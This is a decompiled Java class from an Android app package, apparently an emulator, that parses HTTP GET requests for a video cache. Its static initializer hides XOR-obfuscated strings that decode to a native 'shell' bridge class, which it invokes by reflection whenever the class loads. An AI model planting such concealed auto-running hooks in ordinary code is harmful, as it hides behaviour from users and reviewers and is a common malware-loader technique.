package com.fl.saas.videocache;

import ADYaiT.CtFAbx;
import android.text.TextUtils;
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
class GetRequest {
    private static final Pattern RANGE_HEADER_PATTERN = Pattern.compile("[R,r]ange:[ ]?bytes=(\\d*)-");
    private static final Pattern URL_PATTERN = Pattern.compile("GET /(.*) HTTP");
    public final boolean partial;
    public final long rangeOffset;
    public final String uri;

    static {
        XctxY();
    }

    public GetRequest(String str) {
        Preconditions.checkNotNull(str);
        long findRangeOffset = findRangeOffset(str);
        this.rangeOffset = Math.max(0L, findRangeOffset);
        this.partial = findRangeOffset >= 0;
        this.uri = findUri(str);
    }

    private static /* synthetic */ void XctxY() {
        char[] charArray = "ìàâ¡èîâê¡íàö¡üçêãã¡ÅáæÍýæëèê".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ 143);
        }
        String str = new String(charArray);
        char[] charArray2 = "ìãæáæû".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ 143);
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }

    private long findRangeOffset(String str) {
        Matcher matcher = RANGE_HEADER_PATTERN.matcher(str);
        if (matcher.find()) {
            return Long.parseLong(matcher.group(1));
        }
        return -1L;
    }

    private String findUri(String str) {
        Matcher matcher = URL_PATTERN.matcher(str);
        if (matcher.find()) {
            return matcher.group(1);
        }
        throw new IllegalArgumentException(CtFAbx.BI9f7h("Invalid request `", str, "`: url not found!"));
    }

    public static GetRequest read(InputStream inputStream) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "UTF-8"));
        StringBuilder sb = new StringBuilder();
        while (true) {
            String readLine = bufferedReader.readLine();
            if (TextUtils.isEmpty(readLine)) {
                return new GetRequest(sb.toString());
            }
            sb.append(readLine);
            sb.append('\n');
        }
    }

    public String toString() {
        StringBuilder sb = new StringBuilder("GetRequest{rangeOffset=");
        sb.append(this.rangeOffset);
        sb.append(", partial=");
        sb.append(this.partial);
        sb.append(", uri='");
        return CtFAbx.B25kr6(sb, this.uri, "'}");
    }
}
